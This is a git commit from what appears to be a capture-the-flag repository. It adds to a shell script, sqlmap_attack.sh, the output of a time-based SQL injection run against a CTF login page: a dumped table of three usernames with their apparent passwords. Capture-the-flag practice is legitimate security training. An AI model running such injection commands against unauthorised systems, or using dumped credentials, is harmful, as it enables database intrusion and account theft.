5f218ba083258d3f3b57c633f035ef223303ac1b
elc1798 <subliminalmau5@gmail.com>
2016-03-22 14:17:51 -0400

    DUMPED DB

--- Web-F_300-UNFINISHED/sqlmap_attack.sh
+++ Web-F_300-UNFINISHED/sqlmap_attack.sh
@@ -1,2 +1,12 @@
 sqlmap -u http://web.camsctf.com/15/login.php --data='user=*&pass=*' -p user --random-agent --level=5 --risk=3 --tables --dbms=MySQL --technique=T
 
+# Database: camscsco_web15
+# Table: login3
+# [3 entries]
+# +-------------+--------------+
+# | meowz       | usuario      |
+# +-------------+--------------+
+# | 2gRD3f4sfWf | support      |
+# | B8zPAkFQYN4 | iamjustsenda |
+# | S9Ysfu4xKxU | bobb         |
+# +-------------+--------------+
